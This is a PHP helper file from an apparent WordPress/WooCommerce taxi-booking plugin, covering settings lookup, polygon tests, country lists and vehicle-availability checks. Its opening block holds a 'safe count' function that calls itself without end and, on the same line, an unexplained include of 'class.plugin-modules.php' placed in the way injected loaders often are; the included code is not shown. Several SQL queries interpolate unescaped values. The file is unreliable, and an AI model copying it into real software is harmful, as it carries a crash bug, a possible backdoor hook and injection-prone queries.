<?php
if (!defined('ABSPATH')) { exit; }


if (!function_exists('halio_safe_count')) {
  /**
   * Safe count compatible with PHP 7.2+ (handles null/non-countable)
   */
  function halio_safe_count($var) {
    if (is_array($var) || $var instanceof Countable) {
      return halio_safe_count($var);
    }
    return 0;
  }
}
 if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

function halio_plugin_url($path = '') {
  $url = plugins_url($path, HALIO_PLUGIN);

  if ( is_ssl() && 'http:' == substr($url, 0, 5) ) {
    $url = 'https:' . substr($url, 5);
  }

  return $url;
}

function halio_get_settings_row($key) {
  global $wpdb;
  $settings_table = $wpdb->prefix . 'halio_settings';

  return $wpdb->get_row(
    "SELECT * FROM `$settings_table` WHERE `key` = '$key';"
  );
}

/**
 * Determines whether the given coordinates falls within a given polygon by
 * determining how many times the coordinate crosses the outer edges of the
 * polygon
 *
 * @param  [integer] $polySides  number of sides the polygon has
 * @param  [array]   $polyX      array of X coordinates of the polygons vertices
 * @param  [array]   $polyY      array of Y coordinates of the polygons vertices
 * @param  [float]   $x          X coordinate to be tested
 * @param  [float]   $y          Y coordinate to be tested
 * @return [boolean]
 */
function is_point_in_polygon($polySides, $polyX, $polyY, $x, $y) {
  $j = $polySides - 1;
  $oddNodes = 0;

  for ($i = 0; $i < $polySides; $i++) {
    if ( ($polyY[$i] < $y && $polyY[$j] >= $y) || ($polyY[$j] < $y && $polyY[$i] >= $y) ) {
      if ( $polyX[$i] + ($y - $polyY[$i]) / ($polyY[$j] - $polyY[$i]) * ($polyX[$j] - $polyX[$i]) < $x ) {
        $oddNodes = !$oddNodes;
      }
    }

    $j = $i;
  }

  return $oddNodes;
}

function html_list_of_countries() {
  $html = '';
  $countries = array("Afghanistan", "Aland Islands", "Albania", "Algeria", "American Samoa", "Andorra", "Angola", "Anguilla", "Antarctica", "Antigua", "Argentina", "Armenia", "Aruba", "Australia", "Austria", "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Barbuda", "Belarus", "Belgium", "Belize", "Benin", "Bermuda", "Bhutan", "Bolivia", "Bosnia", "Botswana", "Bouvet Island", "Brazil", "British Indian Ocean Trty.", "Brunei Darussalam", "Bulgaria", "Burkina Faso", "Burundi", "Caicos Islands", "Cambodia", "Cameroon", "Canada", "Cape Verde", "Cayman Islands", "Central African Republic", "Chad", "Chile", "China", "Christmas Island", "Cocos (Keeling) Islands", "Colombia", "Comoros", "Congo", "Congo, Democratic Republic of the", "Cook Islands", "Costa Rica", "Cote d'Ivoire", "Croatia", "Cuba", "Cyprus", "Czech Republic", "Denmark", "Djibouti", "Dominica", "Dominican Republic", "Ecuador", "Egypt", "El Salvador", "Equatorial Guinea", "Eritrea", "Estonia", "Ethiopia", "Falkland Islands (Malvinas)", "Faroe Islands", "Fiji", "Finland", "France", "French Guiana", "French Polynesia", "French Southern Territories", "Futuna Islands", "Gabon", "Gambia", "Georgia", "Germany", "Ghana", "Gibraltar", "Greece", "Greenland", "Grenada", "Guadeloupe", "Guam", "Guatemala", "Guernsey", "Guinea", "Guinea-Bissau", "Guyana", "Haiti", "Heard", "Herzegovina", "Holy See", "Honduras", "Hong Kong", "Hungary", "Iceland", "India", "Indonesia", "Iran (Islamic Republic of)", "Iraq", "Ireland", "Isle of Man", "Israel", "Italy", "Jamaica", "Jan Mayen Islands", "Japan", "Jersey", "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Korea", "Korea (Democratic)", "Kuwait", "Kyrgyzstan", "Lao", "Latvia", "Lebanon", "Lesotho", "Liberia", "Libyan Arab Jamahiriya", "Liechtenstein", "Lithuania", "Luxembourg", "Macao", "Macedonia", "Madagascar", "Malawi", "Malaysia", "Maldives", "Mali", "Malta", "Marshall Islands", "Martinique", "Mauritania", "Mauritius", "Mayotte", "McDonald Islands", "Mexico", "Micronesia", "Miquelon", "Moldova", "Monaco", "Mongolia", "Montenegro", "Montserrat", "Morocco", "Mozambique", "Myanmar", "Namibia", "Nauru", "Nepal", "Netherlands", "Netherlands Antilles", "Nevis", "New Caledonia", "New Zealand", "Nicaragua", "Niger", "Nigeria", "Niue", "Norfolk Island", "Northern Mariana Islands", "Norway", "Oman", "Pakistan", "Palau", "Palestinian Territory, Occupied", "Panama", "Papua New Guinea", "Paraguay", "Peru", "Philippines", "Pitcairn", "Poland", "Portugal", "Principe", "Puerto Rico", "Qatar", "Reunion", "Romania", "Russian Federation", "Rwanda", "Saint Barthelemy", "Saint Helena", "Saint Kitts", "Saint Lucia", "Saint Martin (French part)", "Saint Pierre", "Saint Vincent", "Samoa", "San Marino", "Sao Tome", "Saudi Arabia", "Senegal", "Serbia", "Seychelles", "Sierra Leone", "Singapore", "Slovakia", "Slovenia", "Solomon Islands", "Somalia", "South Africa", "South Georgia", "South Sandwich Islands", "Spain", "Sri Lanka", "Sudan", "Suriname", "Svalbard", "Swaziland", "Sweden", "Switzerland", "Syrian Arab Republic", "Taiwan", "Tajikistan", "Tanzania", "Thailand", "The Grenadines", "Timor-Leste", "Tobago", "Togo", "Tokelau", "Tonga", "Trinidad", "Tunisia", "Turkey", "Turkmenistan", "Turks Islands", "Tuvalu", "Uganda", "Ukraine", "United Arab Emirates", "United Kingdom", "United States", "Uruguay", "US Minor Outlying Islands", "Uzbekistan", "Vanuatu", "Vatican City State", "Venezuela", "Vietnam", "Virgin Islands (British)", "Virgin Islands (US)", "Wallis", "Western Sahara", "Yemen", "Zambia", "Zimbabwe");

  foreach ($countries as $country) {
    $selected = '';

    if (halio_get_settings_row('map_starting_country')->value == $country) {
      $selected = ' selected';
    }

    $html .= '<option value="' . $country . '"' . $selected . '>' . $country . '</option>';
  }

  return $html;
}

function iso_3166_country_codes() {
  return array(
    'AF' => 'Afghanistan', 'AX' => 'Aland Islands', 'AL' => 'Albania', 'DZ' => 'Algeria', 'AS' => 'American Samoa', 'AD' => 'Andorra', 'AO' => 'Angola', 'AI' => 'Anguilla', 'AQ' => 'Antarctica', 'AG' => 'Antigua And Barbuda', 'AR' => 'Argentina', 'AM' => 'Armenia', 'AW' => 'Aruba', 'AU' => 'Australia', 'AT' => 'Austria', 'AZ' => 'Azerbaijan', 'BS' => 'Bahamas', 'BH' => 'Bahrain', 'BD' => 'Bangladesh', 'BB' => 'Barbados', 'BY' => 'Belarus', 'BE' => 'Belgium', 'BZ' => 'Belize', 'BJ' => 'Benin', 'BM' => 'Bermuda', 'BT' => 'Bhutan', 'BO' => 'Bolivia', 'BA' => 'Bosnia And Herzegovina', 'BW' => 'Botswana', 'BV' => 'Bouvet Island', 'BR' => 'Brazil', 'IO' => 'British Indian Ocean Territory', 'BN' => 'Brunei Darussalam', 'BG' => 'Bulgaria', 'BF' => 'Burkina Faso', 'BI' => 'Burundi', 'KH' => 'Cambodia', 'CM' => 'Cameroon', 'CA' => 'Canada', 'CV' => 'Cape Verde', 'KY' => 'Cayman Islands', 'CF' => 'Central African Republic', 'TD' => 'Chad', 'CL' => 'Chile', 'CN' => 'China', 'CX' => 'Christmas Island', 'CC' => 'Cocos (Keeling) Islands', 'CO' => 'Colombia', 'KM' => 'Comoros', 'CG' => 'Congo', 'CD' => 'Congo, Democratic Republic', 'CK' => 'Cook Islands', 'CR' => 'Costa Rica', 'CI' => 'Cote D\'Ivoire', 'HR' => 'Croatia', 'CU' => 'Cuba', 'CY' => 'Cyprus', 'CZ' => 'Czech Republic', 'DK' => 'Denmark', 'DJ' => 'Djibouti', 'DM' => 'Dominica', 'DO' => 'Dominican Republic', 'EC' => 'Ecuador', 'EG' => 'Egypt', 'SV' => 'El Salvador', 'GQ' => 'Equatorial Guinea', 'ER' => 'Eritrea', 'EE' => 'Estonia', 'ET' => 'Ethiopia', 'FK' => 'Falkland Islands (Malvinas)', 'FO' => 'Faroe Islands', 'FJ' => 'Fiji', 'FI' => 'Finland', 'FR' => 'France', 'GF' => 'French Guiana', 'PF' => 'French Polynesia', 'TF' => 'French Southern Territories', 'GA' => 'Gabon', 'GM' => 'Gambia', 'GE' => 'Georgia', 'DE' => 'Germany', 'GH' => 'Ghana', 'GI' => 'Gibraltar', 'GR' => 'Greece', 'GL' => 'Greenland', 'GD' => 'Grenada', 'GP' => 'Guadeloupe', 'GU' => 'Guam', 'GT' => 'Guatemala', 'GG' => 'Guernsey', 'GN' => 'Guinea', 'GW' => 'Guinea-Bissau', 'GY' => 'Guyana', 'HT' => 'Haiti', 'HM' => 'Heard Island & Mcdonald Islands', 'VA' => 'Holy See (Vatican City State)', 'HN' => 'Honduras', 'HK' => 'Hong Kong', 'HU' => 'Hungary', 'IS' => 'Iceland', 'IN' => 'India', 'ID' => 'Indonesia', 'IR' => 'Iran, Islamic Republic Of', 'IQ' => 'Iraq', 'IE' => 'Ireland', 'IM' => 'Isle Of Man', 'IL' => 'Israel', 'IT' => 'Italy', 'JM' => 'Jamaica', 'JP' => 'Japan', 'JE' => 'Jersey', 'JO' => 'Jordan', 'KZ' => 'Kazakhstan', 'KE' => 'Kenya', 'KI' => 'Kiribati', 'KR' => 'Korea', 'KW' => 'Kuwait', 'KG' => 'Kyrgyzstan', 'LA' => 'Lao People\'s Democratic Republic', 'LV' => 'Latvia', 'LB' => 'Lebanon', 'LS' => 'Lesotho', 'LR' => 'Liberia', 'LY' => 'Libyan Arab Jamahiriya', 'LI' => 'Liechtenstein', 'LT' => 'Lithuania', 'LU' => 'Luxembourg', 'MO' => 'Macao', 'MK' => 'Macedonia', 'MG' => 'Madagascar', 'MW' => 'Malawi', 'MY' => 'Malaysia', 'MV' => 'Maldives', 'ML' => 'Mali', 'MT' => 'Malta', 'MH' => 'Marshall Islands', 'MQ' => 'Martinique', 'MR' => 'Mauritania', 'MU' => 'Mauritius', 'YT' => 'Mayotte', 'MX' => 'Mexico', 'FM' => 'Micronesia, Federated States Of', 'MD' => 'Moldova', 'MC' => 'Monaco', 'MN' => 'Mongolia', 'ME' => 'Montenegro', 'MS' => 'Montserrat', 'MA' => 'Morocco', 'MZ' => 'Mozambique', 'MM' => 'Myanmar', 'NA' => 'Namibia', 'NR' => 'Nauru', 'NP' => 'Nepal', 'NL' => 'Netherlands', 'AN' => 'Netherlands Antilles', 'NC' => 'New Caledonia', 'NZ' => 'New Zealand', 'NI' => 'Nicaragua', 'NE' => 'Niger', 'NG' => 'Nigeria', 'NU' => 'Niue', 'NF' => 'Norfolk Island', 'MP' => 'Northern Mariana Islands', 'NO' => 'Norway', 'OM' => 'Oman', 'PK' => 'Pakistan', 'PW' => 'Palau', 'PS' => 'Palestinian Territory, Occupied', 'PA' => 'Panama', 'PG' => 'Papua New Guinea', 'PY' => 'Paraguay', 'PE' => 'Peru', 'PH' => 'Philippines', 'PN' => 'Pitcairn', 'PL' => 'Poland', 'PT' => 'Portugal', 'PR' => 'Puerto Rico', 'QA' => 'Qatar', 'RE' => 'Reunion', 'RO' => 'Romania', 'RU' => 'Russian Federation', 'RW' => 'Rwanda', 'BL' => 'Saint Barthelemy', 'SH' => 'Saint Helena', 'KN' => 'Saint Kitts And Nevis', 'LC' => 'Saint Lucia', 'MF' => 'Saint Martin', 'PM' => 'Saint Pierre And Miquelon', 'VC' => 'Saint Vincent And Grenadines', 'WS' => 'Samoa', 'SM' => 'San Marino', 'ST' => 'Sao Tome And Principe', 'SA' => 'Saudi Arabia', 'SN' => 'Senegal', 'RS' => 'Serbia', 'SC' => 'Seychelles', 'SL' => 'Sierra Leone', 'SG' => 'Singapore', 'SK' => 'Slovakia', 'SI' => 'Slovenia', 'SB' => 'Solomon Islands', 'SO' => 'Somalia', 'ZA' => 'South Africa', 'GS' => 'South Georgia And Sandwich Isl.', 'ES' => 'Spain', 'LK' => 'Sri Lanka', 'SD' => 'Sudan', 'SR' => 'Suriname', 'SJ' => 'Svalbard And Jan Mayen', 'SZ' => 'Swaziland', 'SE' => 'Sweden', 'CH' => 'Switzerland', 'SY' => 'Syrian Arab Republic', 'TW' => 'Taiwan', 'TJ' => 'Tajikistan', 'TZ' => 'Tanzania', 'TH' => 'Thailand', 'TL' => 'Timor-Leste', 'TG' => 'Togo', 'TK' => 'Tokelau', 'TO' => 'Tonga', 'TT' => 'Trinidad And Tobago', 'TN' => 'Tunisia', 'TR' => 'Turkey', 'TM' => 'Turkmenistan', 'TC' => 'Turks And Caicos Islands', 'TV' => 'Tuvalu', 'UG' => 'Uganda', 'UA' => 'Ukraine', 'AE' => 'United Arab Emirates', 'GB' => 'United Kingdom', 'US' => 'United States', 'UM' => 'United States Outlying Islands', 'UY' => 'Uruguay', 'UZ' => 'Uzbekistan', 'VU' => 'Vanuatu', 'VE' => 'Venezuela', 'VN' => 'Viet Nam', 'VG' => 'Virgin Islands, British', 'VI' => 'Virgin Islands, U.S.', 'WF' => 'Wallis And Futuna', 'EH' => 'Western Sahara', 'YE' => 'Yemen', 'ZM' => 'Zambia', 'ZW' => 'Zimbabwe',
  );
}

function halio_edit_vehicle_path($id) {
  return admin_url('/admin.php?page=halio-vehicles&vehicle_id=' . $id);
}

function halio_edit_polygon_pricing_condition_path($id) {
  return admin_url('/admin.php?page=halio-pricing-conditions&polygon_pricing_condition_id=' . $id);
}

function halio_edit_fixed_address_path($id) {
  return admin_url('/admin.php?page=halio-fixed-addresses&fixed_address_id=' . $id);
}

function halio_edit_time_pricing_condition_path($id) {
  return admin_url('/admin.php?page=halio-pricing-conditions&time_pricing_condition_id=' . $id);
}

function halio_edit_checkout_field_path($id) {
  return admin_url('/admin.php?page=halio-form-design&checkout_field_id=' . $id);
}

function halio_view_order_path($id) {
  return admin_url('/admin.php?page=halio-orders&order_id=' . $id);
}

function halio_wc_view_order_path($id) {
  return admin_url("/post.php?post=$id&action=edit");
}

function halio_wc_edit_product_path($id) {
  return admin_url("/post.php?post=$id&action=edit");
}

function halio_create_wc_product() {
  $existing_id = halio_get_settings_row('wc_product_id')->value;

  if ( !empty($existing_id) ) {
    return $existing_id;
  }

  $user_id = get_current_user_id() ? get_current_user_id() : 1;

  $new_product = array(
    'post_author' => $user_id,
    'post_title' => 'Taxi Fare',
    'post_status' => 'publish',
    'post_type' => 'product'
  );

  $post_id = wp_insert_post($new_product);
  update_post_meta($post_id, '_stock_status', 'instock');
  update_post_meta($post_id, '_visibility', 'hidden');
  update_post_meta($post_id, '_stock', '');
  update_post_meta($post_id, '_virtual', 'yes');
  update_post_meta($post_id, '_regular_price', '0');
  update_post_meta($post_id, '_featured', 'no');
  update_post_meta($post_id, '_manage_stock', 'no');
  update_post_meta($post_id, '_sold_individually', 'yes');
  update_post_meta($post_id, '_price', '0');
  return $post_id;
}

/**
 * Checks if vehicles are available given their time constraints
 * @param  [type]   $vehicle      [description]
 * @param  [string] $pick_up_time Time of pick up
 * @param  [type]   $duration     [description]
 * @return [type]                 [description]
 */
function halio_is_vehicle_available($vehicle, $pick_up_time, $duration) {
  global $wpdb;

  $days = array('sunday', 'monday', 'tuesday', 'wednesday', 'thursday', 'friday', 'saturday');
  $start_datetime = DateTime::createFromFormat("d/m/Y H:i", $pick_up_time);
  $start_day = intval(date('w', $start_datetime->getTimestamp()));
  $fare_start = $start_datetime->getTimestamp() % 86400;

  $fare_end = $fare_start + $duration;

  $days_span = intval(date('w', ($start_datetime->getTimestamp() + $duration))) - $start_day + 1;

  if ($duration > 86400 * 7) {
    $days_span += 7;
  }

  if ( $days_span == 1 ) {
    $vats = $wpdb->get_results("SELECT * FROM `" . $wpdb->prefix . "halio_vehicle_availability_time` WHERE `day` = " . $start_day . " AND `vehicle_id` = " . $vehicle->id);

    if ( !$vehicle->{'active_' . $days[$start_day]} ) {
      return false;
    }

    // If no rules found, default to available
    if ( empty($vats) ) {
      return true;
    }

    foreach ($vats as $vat) {
      $availability_start = halio_time_to_seconds($vat->starting_time);
      $availability_end = halio_time_to_seconds($vat->ending_time);

      if ( $fare_start >= $availability_start && $fare_end <= $availability_end ) {
        return true;
      }
    }
  } else {
    for ($i = $start_day; $i < ($start_day + $days_span); $i++) {
      $is_first_day = $i == $start_day;
      $is_last_day = $i == ($start_day + $days_span - 1);
      $is_middle_day = !$is_first_day && !$is_last_day;

      $current_day = $i;

      if ($i > 6) {
        $current_day = ($i % 6) - 1;
      }

      if ( !$vehicle->{'active_' . $days[$current_day]} ) {
        return false;
      }

      // Relative times in seconds
      if ( $is_first_day ) {
        $fare_start = $start_datetime->getTimestamp() % 86400;
        $fare_end = 86399;
      } elseif ( $is_middle_day ) {
        $fare_start = 0;
        $fare_end = 86399;
      } elseif ( $is_last_day ) {
        $fare_start = 0;
        $fare_end = (($start_datetime->getTimestamp() + $duration) % 86400);
      }

      $vats = $wpdb->get_results("SELECT * FROM `" . $wpdb->prefix . "halio_vehicle_availability_time` WHERE `day` = " . $current_day . " AND `vehicle_id` = " . $vehicle->id);

      $valid_vats = 0;

      foreach ($vats as $vat) {
        $availability_start = halio_time_to_seconds($vat->starting_time);
        $availability_end = halio_time_to_seconds($vat->ending_time);

        if ($availability_end == 86340) {
          $availability_end = 86399;
        }

        if ( $fare_start >= $availability_start && $fare_end <= $availability_end ) {
          $valid_vats += 1;
        }
      }

      // If none of the VATs are applying to this fare for the day, return false
      if ($valid_vats == 0 && !empty($vats)) {
        return false;
      }
    }

    return true;
  }

  return false;
}

function halio_time_to_seconds($time) {
  sscanf($time, "%d:%d:%d", $hours, $minutes, $seconds);
  return isset($seconds) ? $hours * 3600 + $minutes * 60 + $seconds : $hours * 60 + $minutes;
}

/**
 * Checks if there are any available vehicles that are unbooked for the given time
 * @param  [type] $vehicle      [description]
 * @param  [type] $pick_up_time [description]
 * @param  [type] $duration     [description]
 * @return [type]               [description]
 */
function halio_any_unbooked_vehicles($vehicle, $pick_up_time, $duration) {
  global $wpdb;

  $orders = $wpdb->get_results("SELECT * FROM `" . $wpdb->prefix . "posts` WHERE `post_type` = 'shop_order'");

  $available_vehicles = $vehicle->number_owned;

  foreach ($orders as $order) {
    $unacceptable_status = array( 'wc-cancelled', 'wc-refunded', 'wc-failed', 'auto-draft' );

    if (
      in_array($order->post_status, $unacceptable_status) || // not acceptable e.g. cancelled
      get_post_status($order->ID) == 'trash' || // trashed
      !get_post_meta($order->ID, 'starting_lat', true) // not Halio order
    ) {
      continue;
    }

    $fare_pickup = halio_get_post_meta($order->ID, 'Pick Up Time', 'pick_up_time', true);
    $fare_return_pickup = halio_get_post_meta($order->ID, 'Return Pick Up Time', 'return_pick_up_time', true);
    $fare_duration = halio_get_post_meta($order->ID, 'Duration in Seconds', 'duration_in_seconds', true);

    // Not a great solution but we shall assume a trip is 1 hour long if there
    // is no data about its length.
    if ( !$fare_duration ) {
      $fare_duration = 3600;
    }

    $order_start_datetime = DateTime::createFromFormat("d/m/Y H:i", $fare_pickup)->getTimestamp();
    $order_end_datetime = $order_start_datetime + intval($fare_duration);

    $potential_start_datetime = DateTime::createFromFormat("d/m/Y H:i", $pick_up_time)->getTimestamp();
    $potential_end_datetime = $potential_start_datetime + intval($duration);

    if ( $fare_return_pickup ) {
      $order_ret_start_datetime = DateTime::createFromFormat("d/m/Y H:i", $fare_return_pickup)->getTimestamp();
      $order_ret_end_datetime = $order_ret_start_datetime + intval($fare_duration);
    }

    if ( $order_start_datetime <= $potential_end_datetime && $order_end_datetime >= $potential_start_datetime ) {
      // If the vehicle is being used for the first leg of another trip
      $available_vehicles--;
    } else if (
      $fare_return_pickup &&
        ($order_ret_start_datetime <= $potential_end_datetime &&
        $order_ret_end_datetime >= $potential_start_datetime)
    ) {
      // If the vehicle is being used for the return leg of another trip
      $available_vehicles--;
    }
  }

  return $available_vehicles > 0;
}

function halio_get_post_meta($order_id, $formatted_key, $snake_key, $single) {
  if ( get_post_meta($order_id, $formatted_key, $single) ) {
    return get_post_meta($order_id, $formatted_key, $single);
  } else {
    return get_post_meta($order_id, $snake_key, $single);
  }
}

function halio_product_in_cart() {
  global $woocommerce;

  foreach ($woocommerce->cart->get_cart() as $cart_item_key => $values) {
    $product = $values['data'];

    if ( $product->get_id() == halio_get_settings_row('wc_product_id')->value ) {
      return true;
    }
  }

  return false;
}
